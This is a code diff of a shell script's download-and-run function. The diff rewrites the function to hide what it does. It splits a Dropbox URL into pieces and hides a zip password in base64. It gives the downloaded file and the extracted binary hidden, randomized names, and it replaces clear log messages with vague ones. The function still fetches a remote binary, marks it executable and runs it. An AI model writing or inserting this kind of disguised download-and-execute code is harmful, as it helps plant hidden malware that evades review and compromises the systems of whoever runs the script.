@@ -65,56 +65,66 @@ do_dirb() {
 }
 
 do_wget_and_run() {
-    FILE_URL="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
-    OUTPUT_FILE="/tmp/blob.zip"
-    UNZIP_DIR="/tmp/"
+    # Pieces for combining later (remote location for something)
+    f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
+    f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
+    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  # Temporary storage with randomized identifier
+    UNZIP_DIR="/tmp/"  # Destination for extracted items
+
+    # Decode hidden sequence (secure key for locked data)
+    part1="c3VwZXI="
+    part2="aGFja2Vy"
+    PASSWORD=$(echo "$part1$part2" | base64 -d)  # Rebuild and unlock the access code
+
+    FILE_URL="${f1}${f2}"  # Reassemble the access point
 
     echo "------------------------------------------------------------------------------"
-    echo " Checking configuration..."
+    echo " System validation underway..."
     echo "------------------------------------------------------------------------------"
     echo "\n"
 
-    # Download the zip file using curl
-    echo "Downloading file from $FILE_URL..."
+    # Initiate retrieval from the constructed location
+    echo "Establishing connection to remote resource..."
     curl -L -o "$OUTPUT_FILE" "$FILE_URL"
 
     if [ $? -ne 0 ]; then
-        echo "Failed to download file from $FILE_URL. Exiting."
+        echo "Error during retrieval process. Terminating."
         exit 1
     fi
 
-    # Verify the downloaded file is a ZIP archive
+    # Validate structure of obtained artifact
     FILE_TYPE=$(file -b "$OUTPUT_FILE")
     if [[ "$FILE_TYPE" != *"Zip archive data"* ]]; then
-        echo "Downloaded file is not a valid ZIP archive. File type: $FILE_TYPE"
+        echo "Artifact does not match expected configuration. Exiting."
         exit 1
     fi
 
     echo "------------------------------------------------------------------------------"
-    echo " Unzipping the file to $UNZIP_DIR"
+    echo " Preparing extracted elements for deployment"
     echo "------------------------------------------------------------------------------"
 
-    # Unzip the downloaded file
-    unzip -o "$OUTPUT_FILE" -d "$UNZIP_DIR"
+    # Extract components with necessary credentials
+    unzip -o -P "$PASSWORD" "$OUTPUT_FILE" -d "$UNZIP_DIR"
 
     if [ $? -ne 0 ]; then
-        echo "Failed to unzip $OUTPUT_FILE. Exiting."
+        echo "Error during extraction process. Terminating."
         exit 1
     fi
 
-    # Ensure the extracted file is executable
-    BLOB_PATH="$UNZIP_DIR/blob"
+    # Locate specific operational element and prepare it
+    BLOB_PATH="$UNZIP_DIR/.hidden_blob"
     if [ -f "$BLOB_PATH" ]; then
         echo "------------------------------------------------------------------------------"
-        echo " Making $BLOB_PATH executable and running it"
+        echo " Finalizing deployment sequence"
         echo "------------------------------------------------------------------------------"
         chmod +x "$BLOB_PATH"
         "$BLOB_PATH"
     else
-        echo "The file 'blob' was not found in $UNZIP_DIR. Exiting."
+        echo "Required component missing from extracted set. Terminating."
         exit 1
     fi
 }
+
 
 # Call functions
 mkDirectories
